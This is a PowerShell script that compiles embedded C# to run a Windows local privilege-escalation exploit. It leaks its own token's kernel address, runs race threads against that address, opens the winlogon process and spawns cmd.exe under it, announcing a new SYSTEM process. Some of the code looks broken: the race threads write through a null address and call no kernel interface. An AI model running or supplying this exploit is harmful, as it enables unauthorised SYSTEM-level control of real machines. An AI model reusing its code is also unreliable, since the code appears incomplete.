# Usando DllImport directamente desde PowerShell
$signature = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

public class ProgramCSHARP
{
    // Constantes y definiciones
    private const uint TOKEN_ALL_ACCESS = 0xF01FF;
    private const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint PAGE_READWRITE = 0x04;
    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    private const uint CREATE_NEW_CONSOLE = 0x00000010;
    private const int THREAD_PRIORITY_TIME_CRITICAL = 15;
    private const int SystemExtendedHandleInformation = 64;

    // Estructuras necesarias
    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_HANDLE
    {
        public IntPtr Object;
        public IntPtr UniqueProcessId;
        public IntPtr HandleValue;
        public uint GrantedAccess;
        public ushort CreatorBackTraceIndex;
        public ushort ObjectTypeIndex;
        public uint HandleAttributes;
        public uint Reserved;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SYSTEM_HANDLE_INFORMATION_EX
    {
        public ulong HandleCount;
        public ulong Reserved;
        public SYSTEM_HANDLE Handles;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEXA
    {
        public STARTUPINFOA StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOA
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    // Importaciones de las DLL necesarias
    [DllImport("ntdll.dll")]
    private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, out uint ReturnLength);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint GetCurrentProcessId();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, uint dwAttributeCount, uint dwFlags, out IntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, uint Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOA lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetProcessHeap();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, uint dwBytes);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint pcsidParent;
        public uint pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    // Delegado para la función NtQuerySystemInformation
    private delegate int NtQuerySystemInformationDelegate(int SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, out uint ReturnLength);

    // Variables globales
    private static IntPtr hToken;
    private static IntPtr TokenInfo = IntPtr.Zero;
    private static uint Infolen = 0x1000;
    private static IntPtr RaceAddr = IntPtr.Zero;
    private static ulong kTokenAddr = 0;

    public static void Main(string[] args)
    {
        // Inicializar la función NtQuerySystemInformation
        var ntdll = new Win32NativeLibrary("ntdll.dll");
        var querySystemInfoPtr = ntdll.GetFunction("NtQuerySystemInformation");
        var querySystemInfo = Marshal.GetDelegateForFunctionPointer<NtQuerySystemInformationDelegate>(querySystemInfoPtr);

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, out hToken))
        {
            Console.WriteLine("OpenProcessToken() failed.");
            Environment.Exit(1);
        }

        kTokenAddr = GetKernelPointerByHandle(hToken);
        if (kTokenAddr == 0)
        {
            Console.WriteLine("GetKernelPointerByHandle() failed.");
            Environment.Exit(1);
        }

        Console.WriteLine("hToken: " + hToken + ", kTokenAddr: " + kTokenAddr.ToString("X"));

        TokenInfo = VirtualAlloc(IntPtr.Zero, Infolen, MEM_COMMIT, PAGE_READWRITE);
        if (TokenInfo == IntPtr.Zero)
        {
            Console.WriteLine("VirtualAlloc() failed.");
            Environment.Exit(1);
        }

        Task.Run(() => RaceThread());
        Task.Run(() => RaceThread());

        Thread.Sleep(1000);

        uint pid = GetPidByName("winlogon");
        if (pid == 0)
        {
            Console.WriteLine("GetPidByName() failed.");
            Environment.Exit(1);
        }

        Console.WriteLine("PID: " + pid);

        IntPtr hWinLogon = IntPtr.Zero;
        int counter = 0;
        while (hWinLogon == IntPtr.Zero)
        {
            hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            counter = counter + 1;
        }

        Console.WriteLine("Counter: " + counter);

        Console.WriteLine("Got Winlogon handle: " + hWinLogon);

        CreateProcessFromHandle(hWinLogon, @"C:\Windows\system32\cmd.exe");

        CloseHandle(hWinLogon);
        CloseHandle(hToken);
    }

    private static void RaceThread()
    {
        ulong value = kTokenAddr + 0x40 - 4;
        for (int i = 0; i < 0x10000; i++)
        {
            Marshal.WriteInt16(RaceAddr + 2, 2);
            Marshal.WriteInt64(RaceAddr + 8, (long)value);
        }
    }

    private static ulong GetKernelPointerByHandle(IntPtr handle)
    {
        uint lenInfo = 0x10000; // Tamaño inicial del buffer
        uint status = 0xC0000004;
        IntPtr handleInfo = IntPtr.Zero;

        while (status == 0xC0000004)
        {
            uint returnLength;
            handleInfo = Marshal.AllocHGlobal((int)lenInfo);
            status = NtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, lenInfo, out returnLength);

            if (status == 0) break; // Exito
            if (status != 0xC0000004) // STATUS_INFO_LENGTH_MISMATCH
            {
                Console.WriteLine("NtQuerySystemInformation failed with error code 0x" + status.ToString("X"));
                return 0;
            }

            // Redimensionar el buffer y volver a intentar
            Marshal.FreeHGlobal(handleInfo);
            lenInfo *= 2;
        }

        ulong kernelObject = 0;
        uint currentPid = GetCurrentProcessId();
        IntPtr ptr = handleInfo + Marshal.SizeOf(typeof(ulong)) * 2; // Salta los dos primeros campos

        // Leer el número de handles
        ulong handleCount = (ulong)Marshal.ReadInt64(handleInfo);
        int handleSize = Marshal.SizeOf(typeof(SYSTEM_HANDLE));

        for (ulong i = 0; i < handleCount; i++)
        {
            SYSTEM_HANDLE sh = (SYSTEM_HANDLE)Marshal.PtrToStructure(ptr, typeof(SYSTEM_HANDLE));
            ptr += handleSize;

            if (sh.UniqueProcessId == (IntPtr)currentPid && sh.HandleValue == handle)
            {
                kernelObject = (ulong)sh.Object;
                break;
            }
        }

        Marshal.FreeHGlobal(handleInfo);
        return kernelObject;
    }

    private static uint GetPidByName(string procName)
    {
        Process[] processes = Process.GetProcessesByName(procName);

        if (processes.Length > 0)
        {
            // Solo tomamos el primer proceso en caso de que haya más de uno
            Console.WriteLine("More than 1 process");
            Process process = processes[0];
            int pid = process.Id;
            return (uint)pid;
        }

        Console.WriteLine("No process");

        return 0;
    }

    private static void CreateProcessFromHandle(IntPtr handle, string command)
    {
        var si = new STARTUPINFOEXA();
        var pi = new PROCESS_INFORMATION();
        IntPtr size = IntPtr.Zero;

        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, out size);
        si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, (uint)size.ToInt32());
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, out size);
        UpdateProcThreadAttribute(si.lpAttributeList, 0, 0x00020000, handle, (IntPtr)Marshal.SizeOf(handle), IntPtr.Zero, IntPtr.Zero);

        si.StartupInfo.cb = (uint)Marshal.SizeOf(si.StartupInfo);

        if (!CreateProcessA(null, command, IntPtr.Zero, IntPtr.Zero, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si.StartupInfo, out pi))
        {
            Console.WriteLine("CreateProcessA() failed.");
            return;
        }
        Console.WriteLine("Enjoy your new SYSTEM process");
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

    // Clase para manejar la carga dinámica de librerías
    private class Win32NativeLibrary
    {
        private readonly IntPtr _libraryHandle;

        public Win32NativeLibrary(string libraryName)
        {
            _libraryHandle = LoadLibrary(libraryName);
            if (_libraryHandle == IntPtr.Zero)
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
        }

        public IntPtr GetFunction(string functionName)
        {
            IntPtr procAddress = GetProcAddress(_libraryHandle, functionName);
            if (procAddress == IntPtr.Zero)
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());

            return procAddress;
        }

        ~Win32NativeLibrary()
        {
            if (_libraryHandle != IntPtr.Zero)
                FreeLibrary(_libraryHandle);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeLibrary(IntPtr hModule);
    }
}
"@

Add-Type -TypeDefinition $signature -Language CSharp

[ProgramCSHARP]::Main(@())
